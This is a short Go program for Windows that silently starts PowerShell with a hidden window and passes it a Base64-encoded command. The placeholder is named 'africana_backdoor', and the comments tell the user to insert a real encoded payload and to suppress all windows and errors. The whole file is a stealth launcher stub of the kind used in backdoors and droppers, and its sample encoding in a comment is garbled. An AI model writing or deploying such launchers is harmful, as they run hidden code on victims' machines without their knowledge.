package main

import (
	"syscall"
	"unsafe"
)

func main() {
	var procInfo syscall.ProcessInformation
	startupInfo := syscall.StartupInfo{Cb: uint32(unsafe.Sizeof(syscall.StartupInfo{}))}

	// 1. Replace with REAL Base64-encoded PowerShell command
	// Example: "Write-Output 'test'" â†’ "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAHQAZQBzAHQAIgA="
	encodedCommand := "africana_backdoor" // Must be valid Base64

	// 2. Correctly format the command line (no %s, direct concatenation)
	cmd := "powershell.exe -WindowStyle Hidden -Enc " + encodedCommand
	commandLine, _ := syscall.UTF16PtrFromString(cmd)

	// 3. Execute silently (no window, no errors)
	syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		0x08000000, // CREATE_NO_WINDOW flag
		nil,
		nil,
		&startupInfo,
		&procInfo,
	)

	// 4. Avoid handle leaks (no defer, immediate close)
	syscall.CloseHandle(procInfo.Process)
	syscall.CloseHandle(procInfo.Thread)
}
